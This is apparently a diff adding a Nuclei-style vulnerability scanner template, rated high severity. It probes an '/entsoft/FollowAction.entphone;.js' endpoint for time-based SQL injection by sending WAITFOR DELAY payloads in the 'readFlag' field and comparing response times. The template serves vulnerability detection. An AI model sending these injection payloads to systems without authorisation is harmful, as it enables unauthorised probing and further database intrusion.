@@ -1,0 +1,67 @@
+id: msk-template
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+
+http:
+  - raw:
+      - |
+        POST /entsoft/FollowAction.entphone;.js HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        method=updreadFlg&trk_id=a&readFlag=a%27;WAITFOR%20DELAY%20%270:0:0%27--
+
+      - |
+        POST /entsoft/FollowAction.entphone;.js HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        method=updreadFlg&trk_id=a&readFlag=a%27;WAITFOR%20DELAY%20%270:0:2%27--
+
+
+      - |
+        POST /entsoft/FollowAction.entphone;.js HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        method=updreadFlg&trk_id=a&readFlag=a%27;WAITFOR%20DELAY%20%270:0:4%27--
+
+
+      - |
+        POST /entsoft/FollowAction.entphone;.js HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        method=updreadFlg&trk_id=a&readFlag=a
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=0  && duration_1<=2"
+          - "duration_2>=2  && duration_2<=4"
+          - "duration_3>=4  && duration_3<=6"
+
+
+      - type: dsl
+        dsl:
+          - status_code_4==200 && body_4=="" && (duration_1+duration_2+duration_3) > 6
+
